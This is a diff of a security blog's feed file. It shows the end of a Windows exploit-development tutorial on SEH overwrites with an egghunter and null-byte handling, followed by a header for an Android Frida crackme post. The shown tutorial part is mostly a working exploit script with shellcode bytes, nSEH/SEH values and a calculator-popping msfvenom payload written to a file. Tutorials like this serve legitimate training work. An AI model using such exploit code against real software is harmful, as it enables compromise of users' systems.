+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xca\xa9\x5a\x2c\xf3\xaa\x05\x91\x51\xa0\xab\xc6\xeb\xeb\xa1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x19\x79\x96\x87\x1a\x81\x99\xb7\x72\xb0\x12\x58\x04\x4d\xf1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1d\xea\xaf\xd0\x6b\x83\x69\xb1\xd6\xce\x89\x6f\x14\xf7\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9a\xe4\x0c\x11\xef\xe1\x49\x95\x03\x9b\xc2\x70\x24\x08\xe2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x50\x47\xcf\x70\x38\xa6\x6a\xf1\xdb\xb6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w00tw00t&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;496&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;620&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80eb9090&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\xc0\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] payload.txt is ready!&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I used msfvenom for the shellcode and the payload that I used is to pop up a calculator. Run the script and copy paste the exploit to the program you will get the following result:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows18.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool! in this post we take a look at how null byte still can be used to deliver a reliable exploit and we also incoporate egghunter to find more space to our shellcode.&lt;/p&gt;
+
+&lt;p&gt;I hope you enjoy this post and see you later!&lt;/p&gt;</content><author><name></name></author><category term="Windows_Exploit_Development" /><summary type="html">Hello world!</summary></entry><entry><title type="html">Android Application Security [chapter 0x2] - Introduction to Frida 2: OWASP MSTG crackme Level 1-3</title><link href="http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2.html" rel="alternate" type="text/html" title="Android Application Security [chapter 0x2] - Introduction to Frida 2: OWASP MSTG crackme Level 1-3" /><published>2021-07-09T10:44:25+07:00</published><updated>2021-07-09T10:44:25+07:00</updated><id>http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2</id><content type="html" xml:base="http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2.html">&lt;p&gt;Hello world!&lt;/p&gt;
 
 &lt;p&gt;Last time, we do little bit of experiment on how powerful frida could be used to aid our android pentesting analysis(&lt;a href=&quot;https://mobappsecurity.github.io/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1.html&quot;&gt;post&lt;/a&gt;), however, it left us with a big question “whether we can use frida to tamper native library in Android or not ?”&lt;/p&gt;
 
@@ -1919,13 +2149,13 @@ hello world!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
     &lt;p&gt;Blockchain Security&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;Browser Exploitation&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
     &lt;p&gt;Windows Exploit Development(OSED)&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Flutter Reverse Engineering&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Red Team&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
